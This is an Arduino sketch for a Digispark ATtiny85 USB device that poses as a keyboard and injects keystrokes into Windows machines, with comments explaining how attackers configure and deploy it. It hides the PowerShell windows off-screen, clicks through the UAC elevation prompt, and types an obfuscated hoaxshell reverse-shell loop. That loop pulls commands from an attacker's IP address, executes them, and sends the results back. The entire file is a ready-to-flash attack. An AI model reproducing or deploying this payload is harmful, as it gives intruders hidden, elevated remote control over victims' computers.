#define kbd_es_es // You can choose another layout
#include "DigiKeyboard.h"


// This script allow attackers open a hoax_reverse_shell in a machines WINDOWS 10/11 with keyboard LATAM.

// Steps: 
// 1) Use Hoaxshell.py Tool: python3 ./hoaxshell.py -s 192.168.1.137 -r -H "Authorization"
// 2) Change the variables:
#define IP_AND_PORT_ATTACKER "192.168.1.137:8080" //Change with your IP AND PORT ATTACKER
#define TOKEN "d02aa6c1-4c8516d2-de534a98" //Change with the token $i generated in HOAXSHELL
#define TOKEN_PART1 "d02aa6c1" // Change with part 1 of the token $i
#define TOKEN_PART2 "4c8516d2" // Change with part 2 of the token $i
#define TOKEN_PART3 "de534a98" // Change with part 3 of the token $i
// 3) Load to ATTINY 85 DIGISPARK and hack!

void setup() {
}

void loop() {
  // Wait for 2 seconds before executing commands
  DigiKeyboard.delay(2000); 
  
  // Open Execute Task 
  DigiKeyboard.sendKeyStroke(0); // Clear previous key presses
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Windows + R 
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(2000);

  // Hide tab CMD (Comment to debug)
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); // ALT + SPACE
  DigiKeyboard.sendKeyStroke(KEY_M); 
  for (int i = 0; i < 150; i++) {
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Open PowerShell with elevated privileges
  DigiKeyboard.println("start-process powershell -verb runas");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // Move to 'Yes'
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Confirm UAC prompt
  DigiKeyboard.delay(2000); 

  // Hide tab powershell (Comment to debug)
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); // ALT + SPACE
  DigiKeyboard.sendKeyStroke(KEY_M); 
  for (int i = 0; i < 150; i++) {
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);



  // Open Hoax Shell 
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("$s='" IP_AND_PORT_ATTACKER "';$i='" TOKEN "';$p='http://';$v=Invoke-WebRequ'e'st -UseBasicParsing -Uri $p$s/" TOKEN_PART1);
  DigiKeyboard.print(F(" -Headers @{'Authorization'=$i};while ($true){$c=(Invoke-WebRequ'e'st -UseBasicParsing -Uri $p$s/" TOKEN_PART2));
  DigiKeyboard.print(F(" -Headers @{'Authorization'=$i}).Content;if ($c -ne 'None'){"));
  DigiKeyboard.print(F("$r=i'e'x $c -ErrorAction Stop -ErrorVariable e;$r=Out-Str'i'ng -InputObject $r;$t=Invoke-WebRequ'e'st -Uri $p$s/" TOKEN_PART3));
  DigiKeyboard.print(F(" -Method POST -Headers @{'Authorization'=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')}sle'e'p 0.8}"));
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }

}
